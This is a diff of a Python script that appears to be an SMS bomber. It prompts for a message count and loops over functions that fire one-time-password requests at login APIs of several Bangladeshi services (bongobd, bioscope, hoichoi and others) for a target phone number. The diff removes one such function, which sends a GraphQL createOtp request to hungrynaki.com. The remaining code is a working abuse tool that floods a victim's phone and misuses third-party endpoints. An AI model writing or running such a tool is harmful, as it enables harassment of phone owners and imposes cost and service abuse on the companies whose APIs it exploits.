@@ -22,16 +22,6 @@ plusintnumber="+"+intnumber
 
 count = int(input("How Many SMS ?: "))
 
-def hungry():
-
-	json = {"operationName":"createOtp","query":"mutation createOtp($phone: PhoneNumber!, $country: String!, $uuid: String!, $osVersionCode: String, $deviceBrand: String, $deviceModel: String, $requestFrom: String) {\n  createOtp(auth: {phone: $phone, countryCode: $country, deviceUuid: $uuid, deviceToken: \"\"}, device: {deviceType: WEB, osVersionCode: $osVersionCode, deviceBrand: $deviceBrand, deviceModel: $deviceModel}, requestFrom: $requestFrom) {\n    statusCode\n  }\n}\n","variables":{"country":"880","deviceBrand":"Firefox","deviceModel":"83","osVersionCode":"Linux armv7l","phone":natnumber,"requestFrom":"U2FsdGVkX185f3yiTmg+qyQ5jzHz54XyLgKbVuqwPbM=","uuid":"064eee1c-fe0a-4f76-abbc-3e9f2acbd901"}}
-	link = "https://api-v4-1.hungrynaki.com/graphql"
-
-	x = requests.post(link,json=json)
-	print("====>OTP from hungry")
-	print(x.text)
-
-
 def bongo():
 	link = "https://api2.bongobd.com/api/login/send-otp"
 
@@ -92,7 +82,6 @@ def hoichoi():
     print(x.text)
 
 for i in range(count):
-	hungry()
 	bioscope()
 	hoichoi()
 	bl()
